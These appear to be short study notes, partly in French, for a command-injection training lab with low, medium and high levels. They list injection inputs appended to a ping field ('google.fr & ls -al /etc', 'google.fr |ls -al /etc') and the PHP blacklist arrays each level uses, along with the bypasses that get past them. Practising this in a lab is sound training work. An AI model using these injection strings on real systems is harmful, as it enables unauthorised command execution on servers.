# low 

ping google.fr

linux :
ping google.fr && ls -al


windows :

google.fr & dir
google.fr | dir

Cas pratique :
=================

linux
essayer d'utiliser la commande cat / mv / sed / whoami / echo / cd 

windows
essayer d'utiliser la commande more / rename 

apt get update && apt get upgrade

php => `exec("ping google.fr")`

Plesk 


```
'&'  => '',
';'  => '',
'|' => '', 
'-'  => '',
'$'  => '',
'('  => '',
')'  => '',
'`'  => '',
'||' => '',
'&&' => '',
```

# Medium 

```php
// Set blacklist
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
```


google.fr && ls -al
google.fr ls -al


google.fr & ls -al /etc OK
google.fr | ls -al /etc  OK
google.fr || ls -al OK


# High

```php
// Set blacklist
$substitutions = array(
    '||' => '',
    '&'  => '',
    ';'  => '',
    '| ' => '',
    '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
);
```

google.fr |ls -al /etc


